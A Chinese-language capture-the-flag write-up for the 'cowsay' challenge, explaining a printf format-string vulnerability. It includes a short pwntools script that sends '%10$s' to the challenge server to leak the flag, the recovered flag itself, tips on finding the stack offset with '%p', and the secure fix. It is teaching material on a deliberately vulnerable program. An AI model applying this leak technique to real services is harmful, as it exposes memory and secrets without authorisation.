# cowsay

## 题目简述

程序把 flag 读入栈上的 `char flag[64]`，并保留一个局部指针 `flag_pointer = flag`。用户输入进入 `message[64]` 后，被直接当作格式字符串传给 `printf(message)`。因此可以利用格式化字符串的参数读取功能，把栈上的 `flag_pointer` 解释为 `%s` 参数。

## 解题过程

漏洞点不是缓冲区溢出，而是缺少固定格式：

```c
printf("< ");
printf(message);
printf(" >\n");
```

在目标编译布局中，`flag_pointer` 对应 `printf` 的第 10 个位置参数。`%10$s` 会取第 10 个参数值作为 `char *`，持续读取到空字节；该指针正好指向已加载的 flag。

```python
from pwn import remote

io = remote("tjc.tf", 31258)
io.sendlineafter(b"> ", b"%10$s")
print(io.recvall().decode())
```

返回的牛对话框中直接出现：

```text
tjctf{m0o0ooo_f0rmat_atTack1_1337}
```

若没有源码中的官方偏移，可先本地发送 `%p.` 的重复序列观察栈参数，再逐个用 `%N$s` 验证；远程时不应盲目解引用任意地址，以免进程因非法指针崩溃。

## 方法总结

- `printf(user_input)` 是直接的格式化字符串漏洞；安全写法应为 `printf("%s", user_input)`。
- `%N$s` 与 `%N$p` 的区别在于前者会解引用参数，因此应先确定槽位中确实是可读指针。
- 本题无需任意写或控制流劫持，因为 flag 已在栈上，且源码特意保留了指向它的局部指针，信息泄漏就是最短利用链。
